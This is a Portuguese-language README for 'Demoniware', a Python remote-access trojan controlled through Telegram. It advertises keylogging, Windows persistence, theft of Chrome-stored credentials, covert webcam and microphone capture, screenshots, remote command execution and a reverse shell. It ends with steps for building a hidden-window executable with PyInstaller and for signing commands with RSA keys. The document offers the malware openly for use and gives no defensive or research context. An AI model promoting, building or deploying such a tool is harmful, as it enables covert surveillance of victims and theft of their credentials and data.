# Demoniware
Telegram BotNet

- Controle de múltiplos hosts com uma única chave API do Telegram;
- Dowload de arquivos através do recebimento de arquivos nativo do Telegram;
- Upload de arquivos através do envio de arquivos nativo do Telegram;
- Execução de comandos nativos do sistema;
- Informações do S.O;
- Informações de IP;
- Informações de Geolocalização baseado no endereço IP;
- Listagem de diretórios e arquivos utilizando expressão regular;
- Keylogger que pode ser habilitado e desabilitado quando necessário;
- Malware persistente (Windows);
- Listar webcams por ID;
- Utilização da webcam para tirar fotos;
- Utilização do microfone para gravar audio;
- PrintScreen;
- Listar processos;
- Matar processos pelo PID;
- Coleta credenciais armazenadas no Google Chrome;
- Gerar par de chaves RSA;
- Assinar comando com chave privada RSA;
- Reverse Shell;
- Reverse webcam streaming;

#Instalar OpenCV Windows
http://opencv-python-tutroals.readthedocs.io/en/latest/py_tutorials/py_setup/py_setup_in_windows/py_setup_in_windows.html

#Instalar Visual C++ Compiler
https://www.microsoft.com/en-us/download/details.aspx?id=44266

#Instalar dependencias 
pip install -r dependencies.txt

# Gerar exe
pyinstaller --onefile --windowed --hidden-import=queue --icon='icone.ico'(Optional) Demoniware.py

# Gerar RSA chaves.
python generate.py create

# Assinar comandos, Ex.
python generate.py "hostname /snapshot 0"
